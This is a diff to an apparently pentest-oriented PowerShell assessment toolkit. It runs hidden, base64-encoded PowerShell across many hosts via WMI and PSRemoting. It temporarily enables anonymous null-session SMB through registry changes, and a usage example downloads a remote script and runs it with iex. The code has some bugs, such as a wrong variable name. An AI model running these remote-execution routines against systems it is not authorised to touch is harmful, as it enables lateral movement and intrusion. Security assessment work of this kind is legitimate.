@@ -1692,11 +1692,12 @@ function Get-DomainCertificates{
 }
 function Invoke-WindowsSMB {
     <#
-    Author: Cube0x0
-    License: BSD 3-Clause
+        Author: Cube0x0
+        License: BSD 3-Clause
 
         .SYNOPSIS
         Uses WMI and a local smb server
+        RUN THIS ON A DOMAIN JOINED PC FOR BEST RESULTS
 
         .PARAMETER Hosts
         Array of hostnames
@@ -1747,40 +1748,51 @@ function Invoke-WindowsSMB {
             return
         }
     }
+    
     if(!(Test-Path $SMBFolder)){
         Write-Output "[*]Creating smb folder"
         New-Item -Force -ItemType directory -Path $SMBFolder | Out-Null
     }
+    #https://serverfault.com/questions/51635/how-can-an-unauthenticated-user-access-a-windows-share
+    Write-Output "[*]Modifying registry to allow anonymous smb access"
+    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name everyoneincludesanonymous -PropertyType DWord -Value "1" –Force | Out-Null
+    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name restrictanonymous -PropertyType DWord -Value "0" –Force | Out-Null
+    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name NullSessionShares -PropertyType MultiString -Value "temp" –Force | Out-Null
+    New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\ -Name  RestrictNullSessAccess -PropertyType DWord -Value "0" –Force | Out-Null
+
     Write-Output "[*]Creating smb share and setting permissions"
     try{
-        New-SmbShare -Path $SMBFolder -ChangeAccess 'Guest','Everyone' -name temp -ErrorAction stop | Out-Null
+        New-SmbShare -Path $SMBFolder -ChangeAccess 'Anonymous logon','Everyone','Guest' -name temp -ErrorAction stop | Out-Null
     }catch{
         throw
     }
-    
-    icacls $SMBFolder /grant Guest:M
     icacls $SMBFolder /grant Everyone:M
-
     $timer = [Diagnostics.Stopwatch]::StartNew()
+    $hostscount=New-Object System.Collections.ArrayList
 
     foreach($_host in $hosts) {
         $_command = "$Command | out-file -encoding ascii -FilePath  \\$FQDN\temp\$_host"
-        Write-Output "[*]Executing $_command on $_host"
+        Write-Output "[*]Executing: $_command on $_host"
         $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_Command))
-        Invoke-WmiMethod -ComputerName $_host -Path Win32_process -Name create -ArgumentList "powershell.exe -window hidden -exe bypass -nop -enc $encodedCommand" | out-null
+        try{
+            Invoke-WmiMethod -ComputerName $_host -Path Win32_process -Name create -ArgumentList "Powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $encodedCommand" -ErrorAction Stop | out-null
+            $hostscount.add($_host) | Out-Null
+        }catch{
+            Write-Output "[-]Failed executing WMI on $_host"
+        }
     }
 
-    while($done.Count -ne $Hosts.Count){
+    while($done.Count -ne $hostscount.Count){
         Start-Sleep -Seconds 10
         $done=New-Object System.Collections.ArrayList
         $checkedin=New-Object System.Collections.ArrayList
         $c=$null
         $d=$null
         try{
-            $c = (gci $SMBFolder | where {$_.Length -eq 0}).name
+            $c = (gci $SMBFolder | where {$_.Length -lt 50}).name
         }catch{}
         try{
-            $d = (gci $SMBFolder | where {$_.Length -gt 0}).name
+            $d = (gci $SMBFolder | where {$_.Length -gt 50}).name
         }catch{}
         foreach($_host in $c){
             if($_host -notin $checkedin){
@@ -1796,6 +1808,16 @@ function Invoke-WindowsSMB {
     }
     $timer.Stop()
     Write-Output "Scan took $($timer.Elapsed.TotalSeconds) Seconds"
+
+    Write-Output "[*]Removing smb share and permissions"
+    Remove-SmbShare temp -Confirm:$false
+    icacls $SMBFolder /remove Everyone:M
+
+    Write-Output "[*]Restoring registry back to default"
+    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name everyoneincludesanonymous -PropertyType DWord -Value "0" –Force | Out-Null
+    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name restrictanonymous -PropertyType DWord -Value "1" –Force | Out-Null
+    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name NullSessionShares -PropertyType MultiString -Value "" –Force | Out-Null
+    New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\ -Name  RestrictNullSessAccess -PropertyType DWord -Value "1" –Force | Out-Null
 }
 function Invoke-WindowsWMI{
     <#
@@ -1811,14 +1833,19 @@ function Invoke-WindowsWMI{
     #>
     param (
         [Parameter(Position=0,ValueFromPipeline=$True)]
-        $Computers = ".\windows.txt",
+        [string[]]$Hosts,
 
         [ValidateScript({Test-Path -Path $_ })]
-        $ScriptPath,
+        [string]$HostList,
         
-        [string]$Url
+        [ValidateScript({Test-Path -Path $_ })]
+        $ScriptPath,
+
+        [string]$Command,
+
+        [string]$OutputFolder = "$((Get-Location).path)\windows"
     )
-    function local:Invoke-WMIExec{
+    function Invoke-WMIExec{
         <#        
             .SYNOPSIS
              Execute command remotely and capture output, using only WMI.
@@ -1951,58 +1978,50 @@ function Invoke-WindowsWMI{
             Write-Output $result
         }
         main
-    }    
-    if(Test-Path $Computers){
-        $Computers = Get-Content $Computers -ErrorAction Stop
+    }
+    if($HostList){
+        if(Test-Path $HostList){
+            try{
+                $Hosts += Get-Content $Computers -ErrorAction Stop
+            }catch{
+                throw
+            }
+        }
     }
     #Import dependencies
     try{
         Import-Module PoshRSJob -ErrorAction Stop
     }catch{
-        Write-Output "[-] $($_.Exception.Message)"
+        Write-Output "[-] install-module PoshRSJob"
         return
     }
     #Error checking
-    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
-        return
-    }
-    #Make sure Invoke-WMIExec is imported
-    $wmi=(Get-ChildItem function: | where {$_.name -like 'Invoke-WMIExec'})
-    if(-not($wmi)){
-        Write-Output "Please import WmiExec.ps1 manually"
-        Write-Output ". .\WmiExec.ps1"
+    if(($null -eq $command) -and ($null -eq $ScriptPath)){
         return
     }
     #Create output folder
-    $OutputFolder = "$((Get-Location).path)\windows"
     if(-not(Test-Path $OutputFolder)){
-        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
+        New-Item -ItemType Directory $OutputFolder | Out-Null
     }
     #Args
     if($ScriptPath){
-        $cmd=Get-Content $ScriptPath -ErrorAction Stop
-    }else{
-        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
+        $command=Get-Content $ScriptPath -ErrorAction Stop
     }
-    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
     $ScriptParams = @{
         'Location' = $OutputFolder
         'Enc' = $Enc
     }
-    #One thread for every computer :D
-    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
-    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad 'Invoke-WMIExec' -ScriptBlock {
-        param($Inputargs)
+    $hosts | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionFilesToImport "$PSScriptRoot\securityassessment.ps1" -ScriptBlock {
+        param(
+            $Inputargs
+        )
         $Location = $Inputargs.Location
         $Enc = $Inputargs.Enc
-        $output = Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Enc"
-        Add-Content -Path "$Location\$($_)" -Value $output
+        
+        $output = Invoke-WMIExec -ComputerName $_ -Command $command
+        Add-Content -Path "$Location\$_" -Value $output
     } | Wait-RSJob -ShowProgress
-    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
-    if($errors){
-        Write-Output "[-] Failed connecting to following hosts"
-        Write-Output $errors
-    }
 }
 function Invoke-WindowsPS{
     <#
@@ -2013,86 +2032,83 @@ function Invoke-WindowsPS{
     Install-Module -Name PoshRSJob -Force
     Too big scripts will not work with ScriptPath
 
-    Invoke-WindowsPS -Url 'http://10.10.10.123/WinEnum.ps1'
-    Invoke-WindowsPS -ScriptPath 'invoke-stager.ps1'
+    Invoke-WindowsPS -hosts pc1,pc2 -Command "iex(new-object net.webclient).downloadstring('http://192.168.4.1/invoke-winenum.ps1');invoke-winenum -extended"
+    Invoke-WindowsPS -hostlist pc.txt -ScriptPath 'invoke-stager.ps1'
     #>
     param (
         [Parameter(Position=0,ValueFromPipeline=$True)]
-        $Computers = ".\windows.txt",
+        [string[]]$Hosts,
+
+        [ValidateScript({Test-Path -Path $_ })]
+        [string]$HostList,
         
         [ValidateScript({Test-Path -Path $_ })]
         $ScriptPath,
 
-        [string]$Url,
+        [string]$Command,
 
-        [Parameter(Mandatory=$true)]
-        [pscredential]$Credential,
-
-        [bool]$UseSSL = $False
+        [string]$OutputFolder = "$((Get-Location).path)\windows"
     )
     #Import ComputerNames
-    if(Test-Path $Computers){
-        $Computers = Get-Content $Computers -ErrorAction Stop
+    if($HostList){
+        if(Test-Path $HostList){
+            try{
+                $Hosts += Get-Content $Computers -ErrorAction Stop
+            }catch{
+                throw
+            }
+        }
     }
     #Import dependencies
     try{
         Import-Module PoshRSJob
     }catch{
-        Write-Output "[-] $($_.Exception.Message)"
+        Write-Output "[-] install-module PoshRSJob"
         return
     }
     #Error checking
-    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
+    if(($null -eq $Command) -and ($null -eq $ScriptPath)){
+        Write-Output "[-]Need -Command or -scriptpath"
         return
     }
     #Create output folder
-    $OutputFolder = "$((Get-Location).path)\windows"
     if(-not(Test-Path $OutputFolder)){
-        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
+        New-Item -ItemType Directory -Path $OutputFolder | Out-Null
     }
     #Args
     if($ScriptPath){
-        $cmd=Get-Content $ScriptPath -ErrorAction Stop
-    }else{
-        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
+        $Command=Get-Content $ScriptPath -ErrorAction Stop
     }
-    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
     $ScriptParams = @{
         'Location' = $OutputFolder
         'Enc' = $Enc
-        'Credential' = $Credential
-        'UseSSL' = $UseSSL
     }
-    #One thread for every computer :D
-    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
-    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -ScriptBlock {
-            param($Inputargs)
-            $Location = $Inputargs.Location
+    $Hosts | start-rsjob -Name {$_} -ArgumentList $ScriptParams -ScriptBlock {
+            param(
+                $Inputargs
+            )
+            #parse args
             $Enc = $Inputargs.Enc
-            $Credential = $Inputargs.Credential
+            $computername = $_
+            $Location = "$($Inputargs.Location)\$computername"
+            #create PSSessions
             try{
-                if($Inputargs.UseSSL){
-                    $session = New-PSSession -ComputerName $_ -Credential $Credential -UseSSL -ErrorAction Stop
-                }else{
-                    $session = New-PSSession -ComputerName $_ -Credential $Credential -ErrorAction Stop
-                }
+                $session = New-PSSession -ComputerName $computername -ErrorAction Stop
             }catch{
-                Add-Content -Path "$Location\$($_)" -Value '[-] Error connecting to host'
+                Add-Content -Path $Location -Value '[-] Error connecting to host'
+                Add-Content -Path $Location -Value "[-] $($_.Exception.Message)"
+                return
             }
             try{
-                $output = Invoke-Command -Session $session -ScriptBlock {powershell -nop -exe bypass -enc $args[0]} -ArgumentList $Enc
+                $output = Invoke-Command -Session $session -ScriptBlock {powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $args[0]} -ArgumentList $Enc
             }catch{
                 $output = "[-] $($_.Exception.Message)"
             }
-            Add-Content -Path "$Location\$($_)" -Value $output
+            Add-Content -Path $Location -Value $output
             Remove-PSSession $session
             
     } | Wait-RSJob -ShowProgress
-    $errors = Get-RSJob | where {$_.HasErrors -eq $true}
-    if($errors){
-        Write-Output "[-] Failed on following hosts"
-        Write-Output $errors
-    }
 }
 function Invoke-LinuxSSH{
     <#
@@ -2637,7 +2653,6 @@ Function Invoke-PingCastle{
         [string]$Domain,
 
         [Parameter(Mandatory=$true)]
-        [ValidateScript({Test-Path -Path $_ })]
         [string]$output,
 
         [Parameter(Mandatory=$true)]
@@ -2652,14 +2667,11 @@ Function Invoke-PingCastle{
         if(!$Domain){
             try{
                 $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+                $Domain = $current_domain.Name
             }catch{
-                Write-Output "[-] $($_.Exception.Message)"
                 Write-Output "Use runas.exe"
-                return
+                throw
             }
-        }
-        if(!$Domain){
-            $Domain = $current_domain.Name
         }
     }
     process{
@@ -2672,6 +2684,7 @@ Function Invoke-PingCastle{
             "--scanner smb --server $Domain"
             "--scanner spooler --server $Domain"
             "--scanner startup --server $Domain"
+            "--scanner antivirus --server $Domainls "
         ) | foreach {
                 "PingCastle.exe $_"
                 Start-Process $Pingcastle -ArgumentList $_ -WorkingDirectory $output -WindowStyle Normal
@@ -2752,6 +2765,7 @@ function Invoke-Grouper2{
         [ValidateScript({Test-Path -Path $_ })]
         [string]$Grouper2
     )
+    $SysvolPath = (gci $SysvolPath).FullName
     if((Get-ChildItem $SysvolPath).Attributes -match 'Archive'){
         [Reflection.Assembly]::LoadWithPartialName( "System.IO.Compression.FileSystem" )
         $destfile = $SysvolPath.TrimEnd('.zip')
